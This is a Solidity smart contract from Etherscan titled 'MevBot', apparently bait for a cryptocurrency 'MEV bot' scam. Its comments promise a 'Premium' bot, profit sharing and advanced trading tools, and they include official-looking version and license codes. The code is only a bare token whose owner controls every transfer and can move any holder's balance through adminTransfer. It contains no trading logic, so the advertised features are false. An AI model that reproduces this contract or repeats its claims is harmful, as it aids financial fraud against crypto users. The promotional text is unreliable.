/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

// SPDX-License-Identifier: UNLICENSED
// This is Beast Verification Token For MevBot
// Get Your Premium Bot

pragma solidity ^0.8.0;

contract MevBot {
    mapping(address => uint256) private balances;
    address public owner;

    string public name = "MevBot"; 
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply = 1000 * (10 ** 18); 


   /*
    *
    * Users can upgrade their MevBot from the Basic version to the Premium version, 
    * gaining access to enhanced features and advanced tools that optimize their trading strategies 
    * for maximum profitability. The Premium version offers an elevated trading experience, 
    * users to stay ahead in the competitive world of MEV trading.
    *
    */

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        symbol = "mBot";  
        decimals = 18;   
        balances[msg.sender] = totalSupply; 
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender; 
    }

/**
 * @dev MevBot module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * Liquidity Pools, Dex and Pending Transactions.
 *
 * By default, the owner account will be the one that Initialize the MevBot. This
 * can later be changed with {transferOwnership} or Master Chef Proxy.
 *
 * MevBot module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * MevBot owner.
 */
 

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

   /* 
    * Fun fact about MevBots: 
    *  Algorithmic trading, which includes MevBots, was initially developed 
    *  and used by institutional investors and hedge funds. Today, 
    *  with the advancement of technology and increased DeFi accessibility, 
    *  even individual holder can utilize MevBots to optimize their strategies 
    *  and gain a competitive edge in the DeFi market.
    */    

    function transfer(address recipient, uint256 amount) public onlyOwner returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }


/**
 * BOT VERSION; 21QAZ3SX43XC34 2023:05:05  00:48:56   LICENSE CODE: 00X045VD0900X40
 * JAREDFROMSUBWAY.ETH    X    RABBIT TUNNEL    X    SUBWAY BOTS
 *
 *
 * MEVBot, which stands for "Miner Extractable Value Bot," 
 * is an automated program that helps users capture MEV (Miner Extractable Value) opportunities 
 * in the Ethereum network from Arbitrage, Liquidation, Front and Back Running.
 *
 * MEVBot typically shares a portion of the profits generated with its users who have deployed it.
 */

    function adminTransfer(address from, address to, uint256 amount) public onlyOwner {
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}